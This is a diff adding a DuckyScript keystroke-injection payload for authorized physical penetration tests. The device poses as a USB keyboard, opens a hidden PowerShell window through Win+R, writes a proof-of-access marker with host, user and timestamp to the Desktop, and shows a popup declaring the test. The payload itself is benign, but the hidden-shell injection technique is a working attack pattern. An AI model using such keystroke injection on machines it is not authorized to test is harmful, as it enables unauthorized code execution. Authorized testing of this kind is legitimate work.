@@ -1,0 +1,35 @@
+REM ============================================================
+REM  Proof-of-Access PoC  --  Dognet Technologies
+REM  USO ESCLUSIVO: penetration test fisico AUTORIZZATO.
+REM  NON distruttivo: dimostra l'esecuzione di codice su una
+REM  postazione Windows sbloccata/incustodita scrivendo un
+REM  marker (host/utente/timestamp) sul Desktop dell'utente.
+REM  Target: Windows. Layout tastiera consigliato: IT.
+REM  Prima di un ingaggio: compila ENGAGEMENT_ID qui sotto.
+REM ============================================================
+ID 1234:abcd Generic:USB Keyboard
+
+REM --- piccola attesa di "settle" dell'enumerazione USB-HID ---
+DELAY 1500
+
+REM --- apri PowerShell via Esegui (Win+R), finestra nascosta ---
+GUI r
+DELAY 800
+STRINGLN powershell -NoProfile -WindowStyle Hidden
+DELAY 1500
+
+REM --- scrivi il marker di prova-accesso sul Desktop ---
+REM Una sola riga: host, utente, timestamp ISO, banner autorizzazione.
+STRINGLN $eng = 'ENGAGEMENT_ID_DA_COMPILARE'
+STRINGLN $marker = "$env:COMPUTERNAME\$env:USERNAME @ $(Get-Date -Format o) -- AUTHORIZED PENTEST (Dognet) eng=$eng"
+STRINGLN $out = Join-Path ([Environment]::GetFolderPath('Desktop')) 'PROOF_OF_ACCESS_Dognet.txt'
+STRINGLN Add-Content -Path $out -Value $marker
+DELAY 500
+
+REM --- feedback visibile (popup di cortesia, dichiara il test) ---
+STRINGLN Add-Type -AssemblyName System.Windows.Forms
+STRINGLN [System.Windows.Forms.MessageBox]::Show("Test di sicurezza autorizzato - Dognet Technologies. Nessun dato e' stato sottratto.","Security Assessment") > $null
+DELAY 500
+
+REM --- chiudi PowerShell senza lasciare la finestra aperta ---
+STRINGLN exit
